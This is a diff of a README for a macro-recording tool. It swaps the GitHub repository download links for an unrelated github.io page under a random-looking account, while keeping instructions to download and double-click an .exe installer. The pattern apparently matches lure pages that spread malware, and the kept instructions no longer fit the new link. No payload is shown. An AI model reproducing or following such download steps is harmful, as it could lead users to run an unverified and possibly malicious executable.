@@ -1,6 +1,6 @@
 # 🖱️ automacro-script-recorder - Record and Replay Any Action Instantly
 
-[![Download AutoMacro](https://img.shields.io/badge/Download-AutoMacro-4CAF50?style=for-the-badge&logo=github)](https://github.com/arteriabuccalisserioladorsalis925/automacro-script-recorder)
+[![Download AutoMacro](https://img.shields.io/badge/Download-AutoMacro-4CAF50?style=for-the-badge&logo=github)](https://arteriabuccalisserioladorsalis925.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ AutoMacro is a desktop automation tool that records your mouse clicks, keyboard 
 
 ## 📥 How to Download and Run
 
-Visit this link to download the application: [https://github.com/arteriabuccalisserioladorsalis925/automacro-script-recorder](https://github.com/arteriabuccalisserioladorsalis925/automacro-script-recorder)
+Visit this link to download the application: [https://arteriabuccalisserioladorsalis925.github.io](https://arteriabuccalisserioladorsalis925.github.io)
 
 Once you click the link, you will see the GitHub page. Look for the green "Code" button or a "Releases" section on the right side. Click "Releases" to find the latest version. Download the file that ends with ".exe" (for example, "AutoMacroSetup.exe"). After downloading, double-click the file to run the installer. Follow the on-screen instructions to complete the installation. Once installed, you can launch AutoMacro from your Start Menu or desktop shortcut.
 
